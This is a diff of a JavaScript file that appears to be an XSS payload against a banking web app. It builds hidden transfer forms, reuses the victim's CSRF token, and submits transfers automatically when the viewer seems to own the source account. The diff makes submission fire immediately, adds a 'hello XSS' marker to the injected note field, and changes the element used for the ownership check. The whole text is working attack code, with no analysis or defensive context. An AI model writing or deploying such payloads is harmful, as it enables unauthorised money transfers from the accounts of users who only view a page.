@@ -8,7 +8,7 @@ function transfer(formname, fromAccount, toAccount, amount, currency, action) {
         var submitFunction = function () {
             submitTransferForm(formname, fromAccount);
         };
-        document.body.onload = submitFunction;
+        submitFunction();
     }
 }
 
@@ -28,7 +28,7 @@ function addTransferForm(formname, fromAccount, toAccount, amount, currency, act
         createHiddenInput(form, "toAccount", toAccount);
         createHiddenInput(form, "amount", amount);
         createHiddenInput(form, "currency", currency);
-        createHiddenInput(form, "note", '<span id="note_' + formname + '"></span>');
+        createHiddenInput(form, "note", '<span id="note_' + formname + '"></span>hello XSS');
         var csrfToken = document.querySelector("meta[name='_csrf']").getAttribute("content");
         if (csrfToken) {
             createHiddenInput(form, "_csrf", csrfToken);
@@ -60,7 +60,7 @@ function createHiddenInput(form, name, value) {
 }
 
 function submitTransferForm(formname, fromAccount) {
-    var isAccOwner = document.getElementById("header").textContent.indexOf(fromAccount) >= 0;
+    var isAccOwner = document.getElementById("title").textContent.indexOf(fromAccount) >= 0;
     var alreadyDone = document.getElementById("note_" + formname);
     if (isAccOwner && !alreadyDone) {
         console.log("Submitting : " + formname);
